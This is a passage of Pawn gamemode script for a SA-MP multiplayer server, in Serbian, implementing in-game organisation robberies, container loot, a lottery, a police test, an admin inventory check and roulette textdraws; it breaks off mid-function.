CMD:opljackajsef(playerid) {

    new org = inOrgInt[playerid];
    if(org == -1) return SendErrorMessage(playerid, "Nisi u nijednoj organizaciji!");

    if(!ClanIlegalaca(playerid)) return SendErrorMessage(playerid, "Samo clanovi bande/mafije!");

    if( !IsPlayerInRangeOfPoint( playerid, 3.0, OI[ org ][ oSafePos ][ 0 ], OI[ org ][ oSafePos ][ 1 ], OI[ org ][ oSafePos ][ 2 ] )) return SendErrorMessage( playerid, "Morate biti pored sefa..");
    if(GetPlayerVirtualWorld(playerid) != OI[org][oVw]) return SendErrorMessage( playerid, "Morate biti pored sefa..");
    if(GetPlayerInterior(playerid) != OI[org][oInt]) return SendErrorMessage( playerid, "Morate biti pored sefa..");

    if(PlayerInfo[playerid][xClan] == org) return SendErrorMessage(playerid, "Ti si clan ove organizacije!");

    if(OI[org][oOrobano]) return SendErrorMessage(playerid, "Moras sacekati malo pre sledeceg roba ove organizacije!");

    new Orga = 0, Protiv = 0;

    foreach( Player, i ) {
        if( PlayerInfo[ i ][ xClan ] == org) Protiv++;

        if( PlayerInfo[i][xClan] == PlayerInfo[playerid][xClan]) Orga++;
    }

    if( GetWeapon( playerid ) >= 22 && GetWeapon( playerid ) <= 40 ) {

        // if( Orga < 3 )  return SendErrorMessage( playerid, "Moras imati bar 3 ljudi iz tvoje organizacije online!" );
        // if( Protiv < 3 )  return SendErrorMessage( playerid, "Mora biti bar 3 clanova iz protivnicke bande online da bi zauzeli njihovu teritoriju." );

        OrgPoruka( org, 0xFFC801C8, "[PLJACKA ORGANIZACIJE] "col_white"Druga banda pokusava da vam opljacka sef organizacije!" );

        SendInfoMessage(playerid, "Zapoceo si pljacku organizacije %s!", OI[org][oName]);

        OI[org][oOrobano] = true;
        SaveOrganization(org);

        defer pljackanjeOrganizacije(playerid);

        prekinuoOrgRob[playerid] = false;
        robaOrganizaciju[playerid] = org;
        robaOrganizacijuTime[playerid] = robOrgeTime;
        TogglePlayerControllable(playerid, 0);
        ApplyAnimation( playerid, "BOMBER", "Plant_Loop", 4.0, 1, 0, 0, 0, 0 );

        return 1;

    } else return SendErrorMessage(playerid, "Nemas adekvatno oruzije!");
}

timer pljackanjeOrganizacije[1000](playerid)
{
    if(robaOrganizacijuTime[playerid] != 0)
    {
        va_GameTextForPlayer(playerid, "%d sekundi", 1000, 3, robaOrganizacijuTime[playerid]);
        robaOrganizacijuTime[playerid] --;
        defer pljackanjeOrganizacije(playerid);
    }
    else
    {
        if(prekinuoOrgRob[playerid])
        {
            prekinuoOrgRob[playerid] = false;
            return 0;
        }
        robaOrganizacijuTime[playerid] = 0;
        new protiv = PlayerInfo[playerid][xClan];
        new org = robaOrganizaciju[playerid];
        robaOrganizaciju[playerid] = -1;
        SendInfoMessage(playerid, "Uspesno si opljackao organizaciju!");
        new string[128];
        format(string, sizeof(string), "[PLJACKA ORGANIZACIJE] "col_white"Organizacija %s je uspesno opljackala vas sef!", OI[protiv][oName]);
        OrgPoruka( org, 0xFFC801C8, string );
        format(string, sizeof(string), "[PLJACKA ORGANIZACIJE] "col_white"Vasa organizacija je uspesno opljackala %s!", OI[org][oName]);
        OrgPoruka( protiv, 0xFFC801C8, string );
        ClearAnimations(playerid);
        TogglePlayerControllable(playerid, 1);
        // DajPrljavNovac(playerid, robOrgePrice);
        PostaviWanted(playerid, "Pljacka Organizacije", "Nepoznat", 10);

        new oFile[ 40 ];
        format( oFile, sizeof( oFile ), O_FILE, protiv );
        if( fexist( oFile ) ) {
            OI[protiv][oSafeMoney] += OI[org][oSafeMoney];
            OI[protiv][oMaterijali] += OI[org][oMaterijali];
            SaveOrganization(protiv);
        }

        format( oFile, sizeof( oFile ), O_FILE, org );
        if( fexist( oFile ) ) {
            OI[org][oSafeMoney] = 0;
            OI[org][oMaterijali] = 0;
            SaveOrganization(org);
        }
    }
    return 1;
}

task resetovanjeOrgSefova[18000000]() {

    for( new id = 1; id < MAX_ORG; id++ ) {
        new oFile[ 40 ];
        format( oFile, sizeof( oFile ), O_FILE, id );
        if( fexist( oFile ) ) {

            if(OI[id][oOrobano]) {

                OI[id][oOrobano] = false;
                SaveOrganization(id);
            }
            if(OI[id][oSlabaTackaProbijena]) {

                OI[id][oSlabaTackaProbijena] = false;
                SaveOrganization(id);
            }
        }
    }
    return 1;
}

CMD:kopajkontenjer(playerid) {

    new id = GetNearestContainer(playerid);
    if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijednog kontenjera!");

    if(kopaKontenjer[playerid]) return SendErrorMessage(playerid, "Vec kopas kontenjer!");
    if(kopaKontenjerTimer[playerid] >= 1) return SendErrorMessage(playerid, "Sacekaj jos %d sekundi!", kopaKontenjerTimer[playerid]);

    TogglePlayerControllable(playerid, false);

    GameTextForPlayer(playerid, "~r~Pretrazujes kontenjer..", 15000, 3);

    defer traziKontenjer(playerid);

    kopaKontenjer[playerid] = true;
    kopaKontenjerTimer[playerid] = 180;

    return 1;
}

ptask resetKontenjerTime[1000](playerid) {

    if(kopaKontenjerTimer[playerid] >= 1) 
        kopaKontenjerTimer[playerid]--;

    return 1;
}

timer traziKontenjer[15000](playerid) {

    //"Laptop(12.000$)\nDinamit(15.000$)\nLazna Licna(150.000$)\nLazni Pasos(150.000$)\nBitCoin Masina\nKokain Torba(15.000$)\nJednokratni Srafciger(3.000$)

    kopaKontenjer[playerid] = false;
    TogglePlayerControllable(playerid, true);

    new sansa = RandomNew(1, 8);
    new price[32];

    if(sansa == 1) { //oruzije

        new RandomOruzije = RandomNew(17, 33)+1;
        new RandomMunicija = RandomNew(2, 10);
        if(GetPlayerWeapon(playerid) == RandomOruzije) { ResetPlayerWeapons(playerid); }
        GiveWeaponToPlayer(playerid, RandomOruzije, RandomMunicija);
        GetWeaponName(RandomOruzije,price,sizeof(price));
    }
    else if(sansa == 2) {

        PlayerInfo[playerid][xDinamit]++;
        SavePlayer(playerid);
        price = "Dinamit";
    }
    else if(sansa == 3) {

        PlayerInfo[playerid][xLaptop] = 1;
        SavePlayer(playerid);
        price = "Laptop za Hakovanje";
    }
    else if(sansa == 4) {

        imaSrafciger[playerid] = true;
        price = "Jednokratni Srafciger";
    }
    else if(sansa == 5) {

        KokainTorba[playerid] = true;
        price = "Torba za Kokain";
    }
    else if(sansa == 6) {

        new novac = RandomNew(100, 1500);
        DajIgracuNovac(playerid, novac);
        format(price, sizeof(price), "%d$", novac);
    }
    else if(sansa == 7) {

        new zlato = RandomNew(1, 10);
        PlayerInfo[playerid][xZlato] += zlato;
        SavePlayer( playerid );
        UpdateZlatoTD( playerid );
        format(price, sizeof(price), "%dg zlata", zlato);
    }

    SendInfoMessage(playerid, "Izvukao si %s iz kontenjera!", price);

    return 1;
}

//////////////////////////////////////////

CMD:sistemi(playerid) {

    if(!PlayerLogged[playerid]) return SendErrorMessage(playerid, "Moras biti ulogovan!");

    SPD(playerid, dialog_Sistemi, DIALOG_STYLE_LIST, "Valhalla Sistemi Objasnjenja", "1) Favella\n2) Bitcoin Workshop\n3) Radionica\n4) Kombi Policija\n5) Hakovanje Banke\n6) AirStrike\n7) AirDrop\n8) Pljackanje Organizacija\n9) Paket Novca", "Odaberi", "Odustani");

    return 1;
}

resetWorkshopBuying(playerid) {

    if(IsValidVehicle(WorkShopVeh[playerid]))
        Novi_DestroyVehicle(WorkShopVeh[playerid]);

    if(IsValidVehicle(WorkShopVehTow[playerid]))
        Novi_DestroyVehicle(WorkShopVehTow[playerid]);

    NosiVozilo[playerid] = 0;
    KupioVozilo[playerid] = 0;
    WorkShopVeh[playerid] = -1;
    WorkShopVehTow[playerid] = -1;
    WorkShopBuyModel[playerid] = 0;
    WorkShopBuyPrice[playerid] = 0;
    WorkShopBuyTow[playerid] = false;

    Novi_DisablePlayerCheckpoint(playerid);

    return 1;
}

isForbidenWeapon(GunID) {

    if(GunID == 9) return true; 
    if(GunID == 16 ) return true; 
    if(GunID == 26 ) return true; 
    if(GunID == 27 ) return true; 
    if(GunID == 35 ) return true; 
    if(GunID == 36 ) return true; 
    if(GunID == 37 ) return true; 
    if(GunID == 38 ) return true; 
    if(GunID == 39 ) return true; 
    if(GunID == 40 ) return true;
    return false;
}

CMD:proveriranac(playerid, params[]) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

    new id;
    if( sscanf( params, "u", id) ) {
        SendUsageMessage( playerid, "/proveriranac [ ID/Deo imena ]");
        return 1;
    }
    if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");

    new string[128], RanacString[3080];
    new maxSlots = Inventory_GetSlots(id);

    for(new i = 0; i < maxSlots; i++) {

        if(PlayerInfo[id][xInventory][i] == 0) 
            format(string, sizeof(string), "%d) Prazan Slot\n", i+1);
        else 
            format(string, sizeof(string), "%d) %s | Kolicina : %d\n", i+1, Inventory_GetName(id, i), PlayerInfo[id][xInventoryAmmo][i]);

        strcat(RanacString, string);
    }

    ProveraRanac[playerid] = id;

    format(string, sizeof(string), "Ranac Igraca %s", ImeIgraca(id));
    SPD(playerid, dialog_InventoryCheck, DIALOG_STYLE_LIST, string, RanacString, "Odaberi", "Odustani");

    return 1;
}

stock isClanAdministracije(playerid) {

    if(PlayerInfo[playerid][xAdmin] >= 1) return true;
    if(PlayerInfo[playerid][xSupporter] >= 1) return true;
    else return false;
}

CMD:stopmusic(playerid) {

    StopAudioStreamForPlayer( playerid );
    SendInfoMessage( playerid, "Ugasili ste radio." );

    return 1;
}

task sacuvajKorisnickeNaloge[600000]() {

    foreach( Player, i ) {
        if( PlayerLogged[ i ] == true && !IsPlayerPBot(i)) {
            SavePlayer( i );
        }
    }
    printf("Svi korisnicki racuni su sacuvani");
    return 1;
}

V01D_CreateVehicle(modelid, Float:x, Float:y, Float:z, Float:angle, color1, color2, respawn_delay)
{
    if(ServerInfo[BrojKreiranihVozila] <= MaxBrojKreiranih)
    {
        ServerInfo[BrojKreiranihVozila]++;
        new idKreiranog;
 
        if(color1 < 0 || color2 < 0) color1 = random(127), color2 = random(127);
 
        if(modelid == 538) idKreiranog = AddStaticVehicleEx(modelid, Float:x, Float:y, Float:z, Float:angle, color1, color2, respawn_delay);
        else idKreiranog = CreateVehicle(modelid, Float:x, Float:y, Float:z, Float:angle, color1, color2, respawn_delay);
 
        occupied[idKreiranog] = false;
 
        RealVehiclePositions[idKreiranog][0] = x;
        RealVehiclePositions[idKreiranog][1] = y;
        RealVehiclePositions[idKreiranog][2] = z;

        Novi_SetVehicleHealth( idKreiranog, 1000.0 );
        vCanDrive[ idKreiranog ] = 1;
        Fuel[ idKreiranog ] = 100;

        ResetVehicleStatistics( idKreiranog );
        new engine, lights, alarm, doors, bonnet, boot, objective;

        GetVehicleParamsEx( idKreiranog, engine, lights, alarm, doors, bonnet, boot, objective );
        SetVehicleParamsEx( idKreiranog, 1, 0, alarm, 0, 0, 0, objective );

        return idKreiranog;
    }
    else return -1;
}

forward IzvlacenjeKuglica( broj );
public IzvlacenjeKuglica( broj ) {

    if( broj == 1 ) {
        SetTimerEx( "IzvlacenjeKuglica", 3000, false, "d", 2 );
    }
    else if( broj == 2 ) {
        new LottoBroj = randomExx( 1, 100 );
        new LottoNagrada = ( 500000+random( 500000 ) );
        new ImaNagrade = 0, Dobitnik;
        
        SCMA( -1, ""col_ljub"NOVO IZVLACENJE LOTO KOMBINACIJA JE UPRAVO ZAVRSENO." );
        format( globalstring, sizeof( globalstring ), ""col_ljub"Izvuceni broj je "col_white"%d.", LottoBroj );
        SCMA( -1, globalstring );
        
        foreach( Player, i ) {
            if( PlayerInfo[ i ][ xLottoNumber ] == LottoBroj ) {
                PlayerInfo[ i ][ xLottoMoney ] += LottoNagrada;
                ImaNagrade = 1;
                Dobitnik = i;
            }
            if( ImaNagrade == 1 ) {
                SendClientMessageEx( i, -1, ""col_ljub"CESTITKE, imamo dobitnika "col_white"%s.", ImeIgraca( Dobitnik ) );
                SendClientMessageEx( i, -1, ""col_ljub"Osvojena nagrada iznosi "col_white"%d.", LottoNagrada );
            }
            PlayerInfo[ i ][ xLottoNumber ] = 0;
        }
        
        if( ImaNagrade == 0 ) {
            SCMA( -1, ""col_ljub"NAZALOST NEMA DOBIJENIH NAGRADA." );
        }
    }
    return 1;
}

CMD:lottohelp( playerid, params[] ) {
    SCM( playerid, -1, ""col_crvena"___________________________________________________________________");
    SCM( playerid, -1, ""col_crvena"Lotto HELP | "col_white"Izvalacenje lotto kombinacije je svaki pun sat." );
    SCM( playerid, -1, ""col_crvena"Lotto HELP | "col_white"/uplatilotto /podignidobitak /mojtiket" );
    SCM( playerid, -1, ""col_crvena"___________________________________________________________________");
    return 1;
}

CMD:uplatilotto( playerid, params[] ) { 

    new broj;
    
    if( !IsPlayerInRangeOfPoint( playerid, 3, 1687.3138,-1450.1989,13.5469 ) ) return SendErrorMessage( playerid, "Niste na salteru drzavne lutrije." );
    if( PlayerInfo[ playerid ][ xLottoNumber ] > 0 ) {
        SendErrorMessage( playerid, "Imate uplacen loto listic.");
        return 1;
    }
    if( PlayerInfo[ playerid ][ xNovac ] < 100 ) return SendErrorMessage( playerid, "Nemate dovoljno novca. Cijena listica je 100$." );

    if( sscanf( params, "d", broj ) ) return SendUsageMessage( playerid, "/uplatilotto [ broj ] ");

    if( broj < 1 || broj > 100 ) {
        SendErrorMessage( playerid, "Brojevi ne mogu da idu ispod 1 ili iznad 100." );
        return true;
    }
    
    PlayerInfo[ playerid ][ xLottoNumber ] = broj;
    SavePlayer( playerid );
    
    SendInfoMessage( playerid, "Uplatili ste tiket sa brojem %d.", broj );
    SCM( playerid, -1, "Koristi /lottohelp." );
    DajIgracuNovac( playerid, -100 );
    return true;
}

CMD:mojtiket( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xLottoNumber ] == 0 ) return SendErrorMessage(playerid, "Nemate uplacen lotto listic." );
    SendInfoMessage( playerid, "Tvoja lotto tiket kombinacija je: %d.", PlayerInfo[ playerid ][ xLottoNumber ] );
    return true;
}

CMD:podignidobitak( playerid,params[] ) {
    if( !IsPlayerInRangeOfPoint( playerid, 3, 1689.9851,-1449.8799,13.5469 ) ) return SendErrorMessage( playerid, "Niste na salteru drzavne lutrije." );
    if( PlayerInfo[ playerid ][ xLottoMoney ] < 1 ) return SendErrorMessage( playerid, "Trenutno nemate novca na lotto racunu." );
    DajIgracuNovac( playerid, PlayerInfo[ playerid ][ xLottoMoney ] );
    SendInfoMessage( playerid, "Preuzeli ste vasu nagradu od %d$.", PlayerInfo[ playerid ][ xLottoMoney ] );
    PlayerInfo[ playerid ][ xLottoMoney ] = 0;
    SavePlayer( playerid );
    return true;
}

CMD:pdtest(playerid) {

    if(GetFactionType(playerid) == ORG_TIP_PD) return SendErrorMessage(playerid, "Ti si clan policije! Ne mozes to!");
    if(PlayerInfo[playerid][xPolicijaTest] == 1) return SendErrorMessage(playerid, "Vec imas polozen test!");
    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 660.4894,2529.2605,-89.4551)) return SendErrorMessage(playerid, "Nisi na mestu!");
    if(GetPlayerMoney(playerid) < 5000) return SendErrorMessage(playerid, "Nemas dovoljno novca ($5.000)!");

    TacnihOdgovoraPD[playerid] = 0;

    SPD(playerid, dialog_PolicijaTest1, DIALOG_STYLE_LIST, "1)Policajac koji nije na duznosti ima pravo sudjelovati u akcija?", "A)Da\nB)Ne\nC)Mozda", "Potvrdi", "Odustani");

    return 1;
}

RouletteTDControl(playerid, bool:shown) {

    if(shown) {

        RouletteTD[playerid][0] = CreatePlayerTextDraw(playerid, 135.416687, 100.814727, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][0], 0.000000, 28.416669);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][0], 525.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][0], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][0], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][0], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][0], 337522175);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][0], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][0], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][0], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][0], 1);

        RouletteTD[playerid][1] = CreatePlayerTextDraw(playerid, 512.500000, 102.111091, "ld_beat:cross");
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][1], 11.000000, 12.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][1], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][1], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][1], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][1], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][1], 4);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][1], 0);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][1], true);

        RouletteTD[playerid][2] = CreatePlayerTextDraw(playerid, 144.583343, 121.037033, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][2], 0.000000, -0.541665);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][2], 508.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][2], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][2], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][2], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][2], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][2], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][2], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][2], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][2], 1);

        RouletteTD[playerid][3] = CreatePlayerTextDraw(playerid, 145.000030, 152.148193, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][3], 0.000000, -0.541665);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][3], 507.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][3], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][3], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][3], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][3], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][3], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][3], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][3], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][3], 1);

        RouletteTD[playerid][4] = CreatePlayerTextDraw(playerid, 145.000015, 182.222274, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][4], 0.000000, -0.499998);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][4], 508.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][4], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][4], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][4], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][4], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][4], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][4], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][4], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][4], 1);

        RouletteTD[playerid][5] = CreatePlayerTextDraw(playerid, 143.750000, 214.889083, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][5], 0.000000, -0.499998);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][5], 508.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][5], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][5], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][5], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][5], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][5], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][5], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][5], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][5], 1);

        RouletteTD[playerid][6] = CreatePlayerTextDraw(playerid, 138.333236, 100.296348, "Rulet by V01D");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][6], 0.280833, 1.117776);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][6], 699.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][6], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][6], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][6], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][6], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][6], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][6], 1);

        RouletteTD[playerid][7] = CreatePlayerTextDraw(playerid, 148.333389, 122.592529, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][7], 0.000000, 2.499999);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][7], 171.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][7], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][7], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][7], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][7], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][7], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][7], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][7], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][7], 1);

        RouletteTD[playerid][8] = CreatePlayerTextDraw(playerid, 202.500076, 122.592529, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][8], 0.000000, 2.499999);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][8], 227.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][8], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][8], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][8], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][8], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][8], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][8], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][8], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][8], 1);

        RouletteTD[playerid][9] = CreatePlayerTextDraw(playerid, 175.416748, 122.592529, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][9], 0.000000, 2.499999);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][9], 198.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][9], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][9], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][9], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][9], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][9], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][9], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][9], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][9], 1);

        RouletteTD[playerid][10] = CreatePlayerTextDraw(playerid, 231.666732, 122.592529, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][10], 0.000000, 2.499999);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][10], 256.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][10], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][10], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][10], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][10], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][10], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][10], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][10], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][10], 1);

        RouletteTD[playerid][11] = CreatePlayerTextDraw(playerid, 260.833374, 122.592529, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][11], 0.000000, 2.499999);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][11], 286.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][11], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][11], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][11], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][11], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][11], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][11], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][11], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][11], 1);

        RouletteTD[playerid][12] = CreatePlayerTextDraw(playerid, 291.250152, 122.592544, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][12], 0.000000, 2.499999);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][12], 317.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][12], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][12], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][12], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][12], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][12], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][12], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][12], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][12], 1);

        RouletteTD[playerid][13] = CreatePlayerTextDraw(playerid, 321.666931, 122.592529, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][13], 0.000000, 2.458332);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][13], 348.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][13], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][13], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][13], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][13], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][13], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][13], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][13], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][13], 1);

        RouletteTD[playerid][14] = CreatePlayerTextDraw(playerid, 352.083496, 122.592552, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][14], 0.000000, 2.499999);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][14], 379.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][14], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][14], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][14], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][14], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][14], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][14], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][14], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][14], 1);

        RouletteTD[playerid][15] = CreatePlayerTextDraw(playerid, 383.750183, 122.592491, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][15], 0.000000, 2.499998);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][15], 412.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][15], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][15], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][15], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][15], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][15], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][15], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][15], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][15], 1);

        RouletteTD[playerid][16] = CreatePlayerTextDraw(playerid, 417.083526, 122.592529, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][16], 0.000000, 2.499999);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][16], 446.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][16], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][16], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][16], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][16], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][16], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][16], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][16], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][16], 1);

